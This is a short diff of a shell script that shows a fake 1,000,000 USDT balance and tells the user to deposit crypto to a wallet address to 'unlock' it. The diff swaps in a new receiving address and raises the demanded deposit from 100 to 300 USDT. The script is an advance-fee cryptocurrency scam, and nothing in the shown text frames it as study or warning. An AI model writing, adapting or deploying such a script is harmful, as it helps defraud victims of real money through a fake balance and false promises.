@@ -4,7 +4,7 @@
 
 balance=1000000
 hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099"
-account_id="TXGMiWuK81P6cwy8ZY55bAuuzT5LR77DYB"
+account_id="TS7yb8sobrwXFbL59S3PCcU7JhpNdpYZRR"
 
 usdt_logo="
 \e[38;2;38;161;123m$$$$$$\
@@ -33,7 +33,7 @@ echo -e "$usdt_logo"
 
 fancyBoxEcho "$welcome_message"
 
-echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"
+echo -e "To unlock your balance of $balance USDT, please deposit 300 USDT to the following address: $account_id"
 
 function unlockBalance {
     echo " "
